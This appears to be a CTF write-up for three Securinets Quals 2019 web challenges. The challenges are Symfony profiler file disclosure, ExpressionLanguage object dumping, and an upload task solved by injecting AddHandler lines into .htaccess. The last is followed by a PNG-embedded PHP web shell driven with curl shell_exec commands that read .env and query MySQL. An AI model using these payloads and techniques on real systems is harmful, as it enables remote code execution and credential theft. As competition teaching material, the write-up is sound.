<p align="center">
<img src="logo.png"/>
</p>

# CTFSecurinets Quals 2019 Writeup
This repository serves as a writeup for CTFSecurinets Quals 2019

## Custom Location

**Category:** Web
**Points:** 964
**Author:** TheEmperors
**Description:**

>Try to find out the database credentials.

>The author changed the location of some files to protect the web application from script kiddies.

>Link: https://web0.ctfsecurinets.com/

**Hint:**

> No hint.

<p align="center">
<img src="resources/web-964-custom_location/_description.PNG"/>
</p>

### Write-up
When you visit the task page, you will get this page

<p align="center">
<img src="resources/web-964-custom_location/1.PNG"/>
</p>

Nothing intresting.

Let's try visiting https://web0.ctfsecurinets.com/test

<p align="center">
<img src="resources/web-964-custom_location/2.PNG"/>
</p>

Now we can see an error page. It looks like we have much details as an error page. And it seems that it's based on php Symfony framework.

We try to click on one of the listed files under the error "NotFoundHttpException" text.

For example we try getting access to the link below

<p align="center">
<img src="resources/web-964-custom_location/3.PNG"/>
</p>

We find out that this page show the source code of one of the Symfony project files from this link:

>https://web0.ctfsecurinets.com/_profiler/open?file=vendor/symfony/http-kernel/EventListener/RouterListener.php&line=139#line139

<p align="center">
<img src="resources/web-964-custom_location/4.PNG"/>
</p>

After some tests I changed the URL to:

>https://web0.ctfsecurinets.com/_profiler/

And I was surprised that Symfony web profiler module was enabled. For persons that don't know what profiler is, it's a module that help developpers to debug code while development process. It's enabled on "dev" environnment.

<p align="center">
<img src="resources/web-964-custom_location/5.PNG"/>
</p>

Let's resume what we got, we have profiler enabled and we have to search about database credentials on web profiler configuration.

We get access to one of the logged requests

<p align="center">
<img src="resources/web-964-custom_location/6.PNG"/>
</p>

We go to configuration

<p align="center">
<img src="resources/web-964-custom_location/7.PNG"/>
</p>

And there we can find Symfony configuration

<p align="center">
<img src="resources/web-964-custom_location/8.PNG"/>
</p>

We get access to the "View full PHP configuration" link. But we got a blocking message

<p align="center">
<img src="resources/web-964-custom_location/9.PNG"/>
</p>

It looks like we should find database credentials without phpinfo.

Until now, this is the common solution. The purpose of the task was more difficult. There was only one solution until that the author found a non intending solution.

So I'm gonna start by explaining the non intending solution (easy one) before explaining the intendended solution.

#### Non intended solution (easy one)

This was very easy to find from Request/Response menu. Then, Server Parameters. And then DATABASE_URL variable

>"mysql://symfony_admin:Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}@127.0.0.1:3306/symfony_task"

<p align="center">
<img src="resources/web-964-custom_location/10.PNG"/>
</p>

So the flag is ``Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}``


#### Intended solution (real purpose the task and the hard one)

Because of the previous non intended solution, this intended solution will be very useless. But some teams managed to find this one and that was very smart.

So, I'm gonna explain it.

If we ignore the previous non intended solution, we will try to open the configuration file that contains the database password defined on Symfony project.

So if we return to the configuraion page from the profiler, we can find Symfony framework version

>Symfony 4.2.4

<p align="center">
<img src="resources/web-964-custom_location/11.PNG"/>
</p>

Now, after a quick search from Google, we find the configuration file that contains the database credentials for Symfony 4.2

>https://symfony.com/doc/4.2/best_practices/configuration.html

<p align="center">
<img src="resources/web-964-custom_location/12.PNG"/>
</p>

Then, we try to open `.env` file from the profiler

>https://web0.ctfsecurinets.com/_profiler/open?file=.env

<p align="center">
<img src="resources/web-964-custom_location/13.PNG"/>
</p>

But it looks like that file was not found. And that's when we remember that task name is `Custom Location`. So that we need to find database credentials from a file that was moved to another location.

So how should we find it if we can only read files ?

Since framework configuration files are always available anywhere on the project, our solution was to download a Symfony project (4.2.4) and find out where .env file is loaded. Then we open that file on the Web Profiler on this task. And so we can read the new path of the .env file.

As a requirement, we need to install php 7.1 at least. Otherwise Symfony 3.4 will be installed. But nevermind since starting from Symfony 3.4, the project files tree is the same.

Now, we start searching for the .env file from all Symfony files except Test files, vendor directory (third party directory of any external module), and cache files `grep '\.env' * -R | grep -v Test | grep -v vendor | grep -v cache`

<p align="center">
<img src="resources/web-964-custom_location/14.PNG"/>
</p>

So, after opening all these files, we find that the only possible file that could load `.env` file is `config/bootstrap.php`

And that's how we are going to find out the real `.env` file from the Web Profiler

>https://web0.ctfsecurinets.com/_profiler/open?file=config/bootstrap.php

<p align="center">
<img src="resources/web-964-custom_location/15.PNG"/>
</p>

So, the real `.env` file path is `secret_ctf_location/env`. We try to open it from the Web profiler

>https://web0.ctfsecurinets.com/_profiler/open?file=secret_ctf_location/env

<p align="center">
<img src="resources/web-964-custom_location/16.PNG"/>
</p>

So the flag is `Securinets{D4taB4se_P4sSw0Rd_My5qL_St0L3n}`.
___





## Trading values

**Category:** Web
**Points:** 989
**Author:** TheEmperors
**Description:**

>N00B developers are an easy target. Try to exploit the application feature to get the hidden flag.

>Link: https://web1.ctfsecurinets.com/

**Hint (pinned on Web channel from Discord):**

>Hint 1: Trading values: It's a server side task

>Hint 2: Trading values: change request values as a hacker

>Hint 3: Trading values: For the last part of the task: try to find another one. You don't know it but it's known by everyone

<p align="center">
<img src="resources/web-989-trading_values/_description.PNG"/>
</p>
<p align="center">
<img src="resources/web-989-trading_values/_hint1.PNG"/>
</p>
<p align="center">
<img src="resources/web-989-trading_values/_hint2.PNG"/>
</p>
<p align="center">
<img src="resources/web-989-trading_values/_hint3.PNG"/>
</p>

### Write-up

After we opened the task link, we get this page with a dynamic line chart drawen on real time.

<p align="center">
<img src="resources/web-989-trading_values/1.PNG"/>
</p>

Reading the source code will not give us anything intresting: [index.html](resources/web-989-trading_values/inedx.html). Maybe because of the `Hint 1`.

So by inspecting Network Tab from the Browser (chrome) development tools (Ctrl+Maj+I, then go to Network Tab)

<p align="center">
<img src="resources/web-989-trading_values/2.PNG"/>
</p>

We can see there that each second a HTTP request is sent somewhere.

We inspect one of these requests. For example this one:

```
https://web1.ctfsecurinets.com/default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc%3D&values%5Bv1%5D=STC&values%5Bv2%5D=PLA&values%5Bv3%5D=SDF&values%5Bv4%5D=OCK
```

We find the sent parameters request are

```
formula: KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEpKyh2Mi5hdmcqKHYyLm1kcyt2Mi5kbXEpKS0odjMucGRpK3YzLnBkaSszLzIqKHYzLnJhciktdjMuZ2RwKSswLjI1Kih2NC5tdW0qdjQuZGFkKSp2NC5hdmc=
values[v1]: STC
values[v2]: PLA
values[v3]: SDF
values[v4]: OCK
```

<p align="center">
<img src="resources/web-989-trading_values/3.PNG"/>
</p>

And the returned response is a random float number

<p align="center">
<img src="resources/web-989-trading_values/4.PNG"/>
</p>

The sent `formula` parameter was encoded using base64 base.

We decoded it and we got this result:

```
(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg
```

So the decoded request was

```
formula: (v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg
values[v1]: STC
values[v2]: PLA
values[v3]: SDF
values[v4]: OCK
```

It seems like formula is using v1 attributes (mpk, drf, avg), v2 attributes (avg, mds, dmq), v3 attributes (pdi, rar, gdp, avg) and v4 attributes (mum, dad, avg).

We analyzed different HTTP request parameters and we figured out that formula changes (from Javascript when generating the request) but the concept is the same, the variables v1, v2, v3 and v4 are the same with the same attributes.

The hint 2 `change request values as a hacker` say that we need to change the formula or the values. But everytime we change the values[] value (not the key) we get a HTTP 500 error.

When we remove a values[] parameter (like `values[v4]=OCK`, we get an error that v4 was missing: `Variable "v4" is not valid around position 117 for expression `(v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)+(v2.avg*(v2.mds+v2.dmq))-(v3.pdi+v3.pdi+3/2*(v3.rar)-v3.gdp)+0.25*(v4.mum*v4.dad)*v4.avg`. Did you mean "v1"?`

We googled this error and we got an intresting result

<p align="center">
<img src="resources/web-989-trading_values/5.PNG"/>
</p>

It looks like this feature is based on ExpressionLanguage module from Symfony. So the backend project is a php one. And it's trying to compute that formula using those 4 values.

But how if we follow Hint 2 and remove some `values[]` parameters and we also remove those variables from the `formula` parameter and we only keep one variable ?

For example:

```
formula: (v1.mpk+v1.drf*(v1.mpk/0.5)-v1.drf)/(v1.avg*0.1)
values[v1]: STC
```

So the real parameters request will be (base64(`formula` parameter)):

```
formula: KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEp
values[v1]: STC
```

>Generated URL: https://web1.ctfsecurinets.com/default?formula=KHYxLm1wayt2MS5kcmYqKHYxLm1way8wLjUpLXYxLmRyZikvKHYxLmF2ZyowLjEp%3D&values%5Bv1%5D=STC


We also get a float result. This mean that the backend page is answering to this request correctly.

But how if if keep only v1 insteal of v.<attributes> ?

For example:

```
formula: v1
values[v1]: STC
```

So the real parameters request will be (base64(`formula` parameter)):

```
formula: djE=
values[v1]: STC
```

>Generated URL: https://web1.ctfsecurinets.com/default?formula=djE=&values%5Bv1%5D=STC

We get another intresting result

<p align="center">
<img src="resources/web-989-trading_values/6.PNG"/>
</p>

We get the same thing when we replace `STC` by `OCK` or `SDF` or `PLA`:

Results (resume):

```
For STC: object(App\Entity\STC)#233 (4) { ["id":"App\Entity\STC":private]=> NULL ["avg"]=> int(909) ["mpk"]=> int(100) ["drf"]=> int(48) }
For OCK: object(App\Entity\OCK)#253 (4) { ["id":"App\Entity\OCK":private]=> NULL ["avg"]=> int(43) ["mum"]=> int(96) ["dad"]=> int(39) }
For SDF: object(App\Entity\SDF)#252 (5) { ["id":"App\Entity\SDF":private]=> NULL ["avg"]=> int(328) ["pdi"]=> int(87) ["gdp"]=> int(11) ["rar"]=> int(85) }
For PLA: object(App\Entity\PLA)#232 (4) { ["id":"App\Entity\PLA":private]=> NULL ["avg"]=> int(556) ["mds"]=> int(17) ["dmq"]=> int(74) }
```

So what we talked about before (the v1, v2, v3 and v4 attributes) was correct. And we got a namespace path `(App\Entity\CLASS_NAME` which is related to Symfony (PHP).

But how this works ? We tried to substitute values[v1] value with many values but we always fail.

We read Hint 3 `Trading values: For the last part of the task: try to find another one. You don't know it but it's known by everyone`. This is the difficult part.

Because we don't know about WHAT the author is talking when he say `it`. Maybe is he talking about `values[v1]` value. Because this is what we can actuelly change.

We can't guess it whitout knowing what is `OCK` ? From the previous output, it's an object.

Is the backend page creating a new OCK object using this syntax ? `variable=new <out_input>()` and he is calling computing the formula using that variable ? or is it using `$OCK` variable like this `$<our_input>` ?

We followed the hint 3 and tested `values[v1]=__CLASS__` (to check if the code is going to call `new __CLASS()` to check the first theory. But, we got a blank page (a get a blank page also when we use a random values[v1] value). So this is not working.

Let's try to check the second theory (using a variable name). But we don't know any variable from the backend project.

And since we know that the backend application is based on PHP (Symfony) which is a Framework using classes (this is trivial when we saw namespaces from the object dump `App\Entity\CLASS_NAMES`), we figured out what does mean `Hint 3`. We need to google it and find any well known variable namees that we migh forget it actually but eveyone know it on Internet. And that's how we find the trivial local variable name `$this`.

So we try

```
formula: v1
values[v1]: this
```

So the real parameters request will be (base64(`formula` parameter)):

```
formula: djE=
values[v1]: this
```

>Generated URL: https://web1.ctfsecurinets.com/default?formula=djE=&values%5Bv1%5D=this

And that's how we dump `$this` local variable from which we find the flag

<p align="center">
<img src="resources/web-989-trading_values/7.PNG"/>
</p>

A quick search we find the flag

<p align="center">
<img src="resources/web-989-trading_values/8.PNG"/>
</p>

So, the flag is `Securinets{T00_Ea5y_T0_U5e_This_Local_variable}`.
___






## Unbreakable Uploader

**Category:** Web
**Points:** 1000
**Author:** TheEmperors
**Description:**

>Find out the Mysql credentials and search the flag from the database.

>Link: https://web3.ctfsecurinets.com/

**Hint (pinned on Web channel from Discord):**

>Hint 1 for Unbreakable Uploader: try Action deny, target all on the begining

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/_description.PNG"/>
</p>
<p align="center">
<img src="resources/web-1000-unbreakable_uploader/_hint1.PNG"/>
</p>

### Write-up

When we visit the task page we get this

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/1.PNG"/>
</p>
<p align="center">
<img src="resources/web-1000-unbreakable_uploader/2.PNG"/>
</p>
<p align="center">
<img src="resources/web-1000-unbreakable_uploader/3.PNG"/>
</p>

We have two ways, trying to upload an Image file or trying to add or remove a restriction.

The second way seems useless actually.

So we tried to exploit an upload vulnerability but whatever my file, the application is very smart and detect my PHP files whatever my bypassing method even if I upload a PHP file renamed as a PNG file. Only JPEG and PNG files are allowed. And I think this is why the task was called `Unbreakable Uploader`.

So, maybe should we exploit another vulnerability from the second part of the task (Restrictions Form).

The first hint was to use Deny as an action and an `all` as a target. After that we opened an image 

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/4.PNG"/>
</p>

When, we opened an image, we get a Forbidden response

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/5.PNG"/>
</p>

This means that our all IP address were denied.

It seems that there is an ACL feature to deny and allow targets.

Also, the web server is Apache/2.4.25. Maybe the ACLs are written on .htaccess file ?

We tried to write the target and then I added a new line to add another .htaccess entry. But I failed several time until I got the greatest idea:

>Keep it simple

If I need a new line, let me write simply a new line. So I edited the target `<input>` as a `<textarea>` (Ctrl+Maj+I from Chrome browser, then Ctrl+Shift+C and click on the target input)

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/6.PNG"/>
</p>

I changed `input` to `textarea`

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/7.PNG"/>
</p>

Then, I can write easily new lines.

The first test I did to check if new lines works and at the same time I can check if we can trigger an error inside .htaccess file

Target:

```
test
test2
```

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/8.PNG"/>
</p>

And so we got only `Allow test`. The new created line `test2` was not there.

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/9.PNG"/>
</p>

And as we expected, we triggered a .htaccess error while opening an existing image

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/10.PNG"/>
</p>

We understood why is there a button `I screwed-up everything and I want to reset the task`.

Because we really screwed-up the .htaccess file and we need to reset it.

But, if we only upload PNG and JPEG real files and we can modify .htaccess and bypass editing retrictions from it to add new entries, how can we solve this task and get access to the database ?

After a quick search on internet, we found some documents talking about hardcoding php code inside PNG files that we can execute system commands using HTTP parameters based on this injected code `<?=$_GET[0]($_POST[1]);?>`

>Reference: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

The creator of this technique was really a genious.

We downloaded the existing exploit [xsspng.png](resources/web-1000-unbreakable_uploader/xsspng.png).

Then, we uploaded that PNG file and it was successfull since it was a real PNG file.

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/11.PNG"/>
</p>

We figured out thatwe should change PNG file types using .htaccess so that PNG files will be executed as PHP files.

>Source: https://security.stackexchange.com/a/122937

So, we will use this value as a `target` value

```
test
AddType application/x-httpd-php .png
AddHandler application/x-httpd-php .png
```

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/12.PNG"/>
</p>

It looks great

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/13.PNG"/>
</p>

And also the uploaded PNG image is not displayed as a PNG file

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/14.PNG"/>
</p>

Now, we are going to exploit the RCE using this command

``
curl -i -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=id"
``

And we got a nice result

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/15.PNG"/>
</p>

Now, let's find out the database credentials a step by step.

We get the current location

``
curl -i -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=pwd"
``

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/16.PNG"/>
</p>

So this is a Symfony project. A quick search on google gives up where we can find the database credentials from configuration files.

If the `.env` file exists, if should be there. Otherwise it should be on `app/config/parameters.yml`.

So let's check the project document root

``
curl -i -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=ls ../../../ -lA"
``

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/17.PNG"/>
</p>

`.env` file exists. So let's cat it

``
curl -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=cat ../../../.env"
``

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/18.PNG"/>
</p>

So we got:

```
Mysql Database
Hostname: localhost
Username: symfony_admin
Password: Securinets_dB_P455W0Rd_369
Database: symfony_task_3
```

In this task, mysqldump will not work. Maybe because of the database that was very big or because of user privileges. So we need to searh the flag inside the database step by step.

Let's show database tables:

```
curl -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database symfony_task_3 -e 'show tables'"
```

But this strangely will not work.

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/19.PNG"/>
</p>

We tried to go back and retrieve database names maybe we did something wrong

```
curl -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost -e 'show databases'"
```

Clear Output:

```
Database
big_database
information_schema
```

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/20.PNG"/>
</p>

So the database name that we found on the configuration file `symfony_task_3` was a fake name and instead we should use `big_database`.

Let's list its tables

```
curl -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e6448370067d5.png?0=shell_exec" -d "1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e 'show tables'"
```

Clear output:

```
Tables_in_big_database
user_details
```

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/21.PNG"/>
</p>

And finally we search the flag on that `user_details` table

```
curl -X POST "https://web3.ctfsecurinets.com/uploads/9b3aa7a5c5cebd1318e79442144ffa63/18abe44ac4242278ad0e64d5.png?0=shell_exec" -d "1=mysql -usymfony_admin -pSecurinets_dB_P455W0Rd_369 -hlocalhost --database big_database -e 'select * from user_details' | grep Securinets"
```

Clear output:

```
69069   paul47  brown   morris  fl46    Securinets{T00_MuCh_W0rk}       1
```

<p align="center">
<img src="resources/web-1000-unbreakable_uploader/22.PNG"/>
</p>

So, the flag is `Securinets{T00_MuCh_W0rk}`.

___










# Scoreboard

This is the tasks list released on the CTF:

<p align="center">
<img src="scoreboard/ALL1.PNG"/>
</p>
<p align="center">
<img src="scoreboard/ALL2.PNG"/>
</p>
<p align="center">
<img src="scoreboard/ALL3.PNG"/>
</p>
<p align="center">
<img src="scoreboard/ALL4.PNG"/>
</p>

And, this is the scoreboard and the rankin for the 100/436 teams that they solved at least one task in this CTF :

<p align="center">
<img src="scoreboard/1.PNG"/>
</p>
<p align="center">
<img src="scoreboard/2.PNG"/>
</p>
<p align="center">
<img src="scoreboard/3.PNG"/>
</p>
<p align="center">
<img src="scoreboard/4.PNG"/>
</p>
<p align="center">
<img src="scoreboard/5.PNG"/>
</p>
<p align="center">
<img src="scoreboard/6.PNG"/>
</p>
<p align="center">
<img src="scoreboard/7.PNG"/>
</p>
<p align="center">
<img src="scoreboard/8.PNG"/>
</p>
<p align="center">
<img src="scoreboard/9.PNG"/>
</p>

If you need the Json file of the scoreboard, you can find it [here](scoreboard/score.json)

